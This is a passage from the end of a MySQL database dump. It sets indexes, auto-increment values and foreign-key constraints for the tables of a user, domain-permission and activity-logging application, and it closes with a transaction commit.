  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`),
  ADD KEY `idx_username` (`username`),
  ADD KEY `idx_role` (`role`),
  ADD KEY `idx_assigned_domain` (`assigned_domain`),
  ADD KEY `idx_is_active` (`is_active`),
  ADD KEY `created_by` (`created_by`);

--
-- Indexes for table `user_activity`
--
ALTER TABLE `user_activity`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_user_id` (`user_id`),
  ADD KEY `idx_action_type` (`action_type`),
  ADD KEY `idx_created_at` (`created_at`),
  ADD KEY `idx_session_id` (`session_id`),
  ADD KEY `idx_user_activity_user_created` (`user_id`,`created_at`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `api_tokens`
--
ALTER TABLE `api_tokens`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `domains`
--
ALTER TABLE `domains`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `domain_permissions`
--
ALTER TABLE `domain_permissions`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `login_attempts`
--
ALTER TABLE `login_attempts`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `notifications`
--
ALTER TABLE `notifications`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `reports`
--
ALTER TABLE `reports`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `sessions_cache`
--
ALTER TABLE `sessions_cache`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `system_settings`
--
ALTER TABLE `system_settings`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=19;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `user_activity`
--
ALTER TABLE `user_activity`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `api_tokens`
--
ALTER TABLE `api_tokens`
  ADD CONSTRAINT `api_tokens_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `domains`
--
ALTER TABLE `domains`
  ADD CONSTRAINT `domains_ibfk_1` FOREIGN KEY (`parent_domain_id`) REFERENCES `domains` (`id`) ON DELETE SET NULL,
  ADD CONSTRAINT `domains_ibfk_2` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `domain_permissions`
--
ALTER TABLE `domain_permissions`
  ADD CONSTRAINT `domain_permissions_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `domain_permissions_ibfk_2` FOREIGN KEY (`domain_id`) REFERENCES `domains` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `domain_permissions_ibfk_3` FOREIGN KEY (`assigned_by`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `notifications`
--
ALTER TABLE `notifications`
  ADD CONSTRAINT `notifications_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `notifications_ibfk_2` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `reports`
--
ALTER TABLE `reports`
  ADD CONSTRAINT `reports_ibfk_1` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `system_settings`
--
ALTER TABLE `system_settings`
  ADD CONSTRAINT `system_settings_ibfk_1` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `users`
--
ALTER TABLE `users`
  ADD CONSTRAINT `users_ibfk_1` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `user_activity`
--
ALTER TABLE `user_activity`
  ADD CONSTRAINT `user_activity_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
